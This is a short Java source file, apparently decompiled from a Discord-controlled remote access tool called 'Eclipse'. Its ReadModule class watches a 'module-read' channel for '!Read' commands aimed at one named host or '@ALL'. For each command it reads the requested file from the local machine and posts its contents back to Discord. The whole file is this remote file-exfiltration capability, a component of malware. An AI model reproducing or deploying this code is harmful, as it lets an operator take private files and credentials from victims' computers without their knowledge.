package me.Eclipse.Modules.Impl;

import java.awt.Color;
import java.io.IOException;

import me.Eclipse.Brain;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class ReadModule {
    public static void run(MessageReceivedEvent var0) {
        Message var1 = var0.getMessage();
        if (var1.getChannel().getName().contains("module-read")) {
            if (var1.getContentDisplay().startsWith("!Read " + Brain.Username) || var1.getContentDisplay().startsWith("!Read @ALL")) {
                String var2 = var1.getContentDisplay().replaceFirst("!Read " + Brain.Username + " ", "").replaceFirst("!Read @ALL ", "");

                try {
                    if (Helper.readFile(var2).length() <= 2000) {
                        Helper.sendMessage(Color.GREEN, "Module Read (" + Brain.Username + ")", "`" + Helper.readFile(var2) + "`", var0);
                    } else {
                        Helper.sendMessage(Color.RED, "Module Read (" + Brain.Username + ")", "File is too large.", var0);
                    }
                } catch (IOException var4) {
                    Helper.sendMessage(Color.RED, "Module Read (" + Brain.Username + ")", "File not found.", var0);
                }
            }

        }
    }
}
